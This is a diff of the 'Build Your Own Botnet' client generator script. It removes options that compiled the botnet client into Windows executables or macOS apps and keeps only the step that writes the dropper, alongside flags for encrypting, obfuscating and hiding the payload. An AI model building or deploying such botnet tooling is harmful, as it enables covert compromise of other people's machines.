@@ -3,8 +3,8 @@
 """Client Generator (Build Your Own Botnet)
 
 usage: client.py [-h] [-v] [--name NAME] [--icon ICON] [--pastebin API]
-                 [--encrypt] [--obfuscate] [--compress] [--exe] [--app]
-                 host port [module [module ...]]
+                 [--encrypt] [--obfuscate] [--compress] host port 
+                 [module [module ...]]
 
 Generator (Build Your Own Botnet)
 
@@ -165,14 +165,6 @@ def main():
     parser.add_argument('--compress',
                         action='store_true',
                         help='zip-compress into a self-extracting python script',
-                        default=False)
-    parser.add_argument('--exe',
-                        action='store_true',
-                        help='compile client with a python interpreter into a portable executable for Windows',
-                        default=False)
-    parser.add_argument('--app',
-                        action='store_true',
-                        help='bundle client with a python interpreter into an macOS application',
                         default=False)
     options = parser.parse_args()
     key = base64.b64encode(os.urandom(16))
@@ -396,22 +388,7 @@ def _dropper(options, **kwargs):
     with file(name, 'w') as fp:
         fp.write(dropper)
 
-    if options.exe:
-        util.display('\tCompiling executable... ', color='reset', style='normal', end=',')
-        __load__ = threading.Event()
-        __spin__ = _spinner(__load__)
-        name = generators.exe(name, icon=options.icon, hidden=kwargs['hidden'])
-        __load__.set()
-
-    elif options.app:
-        util.display('\tBundling application... ', color='reset', style='normal', end=',')
-        __load__ = threading.Event()
-        __spin__ = _spinner(__load__)
-        name = generators.exe(name, icon=options.icon, hidden=kwargs['hidden'])
-        __load__.set()
-
-    else:
-        util.display('\tWriting dropper... ', color='reset', style='normal', end=',')
+    util.display('\tWriting dropper... ', color='reset', style='normal', end=',')
     util.display('(saved to file: {})\n'.format(name), style='dim', color='reset')
     return name
 
